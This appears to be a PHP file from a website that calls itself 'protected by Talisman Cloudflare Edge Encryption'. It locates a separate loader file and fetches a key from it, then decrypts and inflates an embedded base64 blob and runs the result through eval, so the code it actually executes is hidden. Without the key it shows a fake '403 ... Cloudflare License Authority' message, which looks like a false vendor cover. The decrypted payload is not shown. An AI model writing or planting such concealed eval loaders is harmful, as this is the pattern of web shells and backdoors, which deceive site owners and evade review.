<?php
/* PROTECTED BY TALISMAN CLOUDFLARE EDGE ENCRYPTION v3.0 */
if(!function_exists('_talisman_runtime_key')){
  $l50056=__DIR__;
  while($l50056&&!file_exists($l50056.'/talisman_loader.php')){
    $p=dirname($l50056);if($p===$l50056)break;$l50056=$p;
  }
  if(file_exists($l50056.'/talisman_loader.php')){require_once $l50056.'/talisman_loader.php';}
}
$k24f04=function_exists('_talisman_runtime_key')?_talisman_runtime_key():false;
if($k24f04===false){header('HTTP/1.1 403 Forbidden');die('403 Security Error: Execution Locked by Cloudflare License Authority.');}
$p1278c=base64_decode('nEY4bMFbWkvKl0oAK7AFR3ZiWC9hMFVWVklRVHQ0b3I4N1p5QUtBTG9VNTJsTTFMei9ua3ZkT2JRVEcvV1NNNFMzRXdFb080YlhiQk1URzZFSm1UNTcwUUgyTWxNKzNCcGlMUHowTmpBaVY2WjBwd0FIT2pUY29DSENjZEdzbHJCaDFqSCs0LzJBZE56UEpMcDZBUU41dkZOTWRnRnU5VDVUTTI4ckwxRE9zNUplOE1ITHEwdTIyaWVNM01BL1Q4Qkx0UUVTTHRIa3pTMUJ6ZXVrV0RBamQ1cWhGZ2pCclhwNitiNHlsR3dtb1F3UUxjdGdWMENKUFM4d1ZTd1dBcndkZEFzN3VvZjFmeVlwRkNiSlhEWmZnUFJvZTBlQkIwd25Gc0dXWWt2VWhYeTA0WlV6VXdKdFc2bTJNT29BUlY4enQxc0VONFY1dGJKaUtJbWxHeWpwR1RJdDIvb1Q1K1RVTDQzWVVyc0xjR0ZiTERiblRhMXpnWVh3cDQ5eUoyOWRXbGlBWVh5Skxqb3ZMc1lQMjlvM0RoUkFQVkpDaTZsem1zcFFkNGY0YnB3emtIbXl1YXI0bGJzd2JseWxhczRlN0FsMWJ1V0FyYXZUemdxdkQyS0VlTXNvS0huK3J2VUhnTE94cHI5VnpBNVFNbmlxQlJNUkhCRWNRcFpBanRLN2pUd2ZEdWV5dzk3ZXZaMzFLcDRXSW1XL3pkb2hrTzlNZW1oTm5LTGREV2k5MEhZTWR4TVh2ZGZxZG9pSlM0dkQxaHJZRUxJRXpjRUo3dFJldGNSS29Mc3l1eTB2ejFnTllzYzExMkNQYy9RcGhMUkQyRGo3Szc5aXd2WHlwZEZpQ0Jza1BMQS8yUXBkV3g=');
$ia3e40=openssl_cipher_iv_length('aes-256-cbc');
$v4e4d9=substr($p1278c,0,$ia3e40);
$cff9e6=substr($p1278c,$ia3e40);
eval('?>'.gzinflate(openssl_decrypt($cff9e6,'aes-256-cbc',$k24f04,0,$v4e4d9)));